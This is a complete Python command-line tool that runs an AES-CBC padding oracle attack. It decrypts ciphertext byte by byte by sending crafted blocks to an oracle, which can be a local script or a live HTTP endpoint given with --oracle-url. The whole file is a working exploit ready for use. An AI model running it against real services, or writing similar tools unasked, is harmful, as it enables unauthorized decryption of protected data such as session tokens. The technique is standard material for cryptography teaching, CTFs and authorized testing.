#!/usr/bin/env python3
"""
AES-CBC padding oracle attack.
Decrypts arbitrary ciphertext block-by-block given a padding oracle function.

Usage modes:
  --oracle-script: path to a Python script that defines oracle(ciphertext_hex) -> bool
  --oracle-url:    HTTP endpoint; sends ciphertext as hex in POST body, True if status 200
"""

import argparse
import importlib.util
import sys
from pathlib import Path


# ── Oracle interface ──────────────────────────────────────────────────────────

def load_script_oracle(script_path: str):
    spec = importlib.util.spec_from_file_location("oracle_module", script_path)
    mod  = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod.oracle  # expects oracle(ciphertext_hex: str) -> bool


def make_url_oracle(url: str):
    import urllib.request
    def oracle(ct_hex: str) -> bool:
        data = ct_hex.encode()
        req  = urllib.request.Request(url, data=data, method='POST')
        try:
            with urllib.request.urlopen(req) as resp:
                return resp.status == 200
        except Exception:
            return False
    return oracle


# ── Padding oracle core ───────────────────────────────────────────────────────

def decrypt_block(prev_block: bytes, curr_block: bytes, block_size: int,
                  oracle) -> bytes:
    """
    Decrypt a single ciphertext block using the padding oracle.
    Returns the plaintext block.
    """
    # intermediate[i] = D(curr_block)[i]  (the AES block cipher output before XOR)
    intermediate = bytearray(block_size)

    for byte_pos in range(block_size - 1, -1, -1):
        padding_val = block_size - byte_pos
        # Craft prefix: we send a modified previous block
        crafted_prev = bytearray(block_size)
        # Set already-known bytes to produce the desired padding
        for k in range(byte_pos + 1, block_size):
            crafted_prev[k] = intermediate[k] ^ padding_val

        found = False
        for guess in range(256):
            crafted_prev[byte_pos] = guess
            # Oracle receives crafted_prev + curr_block
            ct = bytes(crafted_prev) + curr_block
            if oracle(ct.hex()):
                # intermediate[byte_pos] = guess XOR padding_val
                intermediate[byte_pos] = guess ^ padding_val
                found = True
                break

        if not found:
            print(f"[!] Oracle failed at byte position {byte_pos}. Trying 0x00 fallback.")
            intermediate[byte_pos] = 0 ^ padding_val

    # Plaintext = intermediate XOR original previous block
    plaintext = bytes(intermediate[i] ^ prev_block[i] for i in range(block_size))
    return plaintext


def strip_pkcs7(data: bytes) -> bytes:
    if not data:
        return data
    pad_len = data[-1]
    if 1 <= pad_len <= 16 and data[-pad_len:] == bytes([pad_len] * pad_len):
        return data[:-pad_len]
    return data


def decrypt_all(ciphertext: bytes, iv: bytes, block_size: int, oracle) -> bytes:
    blocks = [ciphertext[i:i + block_size]
              for i in range(0, len(ciphertext), block_size)]
    plaintext = b''
    prev = iv

    for i, block in enumerate(blocks):
        print(f"[*] Decrypting block {i + 1}/{len(blocks)} ...", end='\r')
        pt_block = decrypt_block(prev, block, block_size, oracle)
        plaintext += pt_block
        prev = block

    print()
    return strip_pkcs7(plaintext)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="AES-CBC padding oracle attack")
    parser.add_argument("--ciphertext", required=True,
                        help="Hex-encoded ciphertext (without IV)")
    parser.add_argument("--iv", required=True,
                        help="Hex-encoded IV (16 bytes)")
    parser.add_argument("--block-size", type=int, default=16, dest="block_size")

    oracle_src = parser.add_mutually_exclusive_group(required=True)
    oracle_src.add_argument("--oracle-script", dest="oracle_script",
                            help="Python script exposing oracle(ct_hex) -> bool")
    oracle_src.add_argument("--oracle-url", dest="oracle_url",
                            help="HTTP URL of padding oracle endpoint")
    args = parser.parse_args()

    ct = bytes.fromhex(args.ciphertext)
    iv = bytes.fromhex(args.iv)
    bs = args.block_size

    if len(ct) % bs != 0:
        print(f"[!] Ciphertext length {len(ct)} is not a multiple of block size {bs}")
        sys.exit(1)

    if args.oracle_script:
        oracle = load_script_oracle(args.oracle_script)
    else:
        oracle = make_url_oracle(args.oracle_url)

    print(f"[*] Ciphertext: {len(ct)} bytes, {len(ct) // bs} blocks")
    print(f"[*] IV: {iv.hex()}")
    print(f"[*] Block size: {bs}")
    print()

    plaintext = decrypt_all(ct, iv, bs, oracle)
    print(f"\n[+] Plaintext (hex): {plaintext.hex()}")
    print(f"[+] Plaintext (str): {plaintext.decode('utf-8', errors='replace')}")


if __name__ == "__main__":
    main()
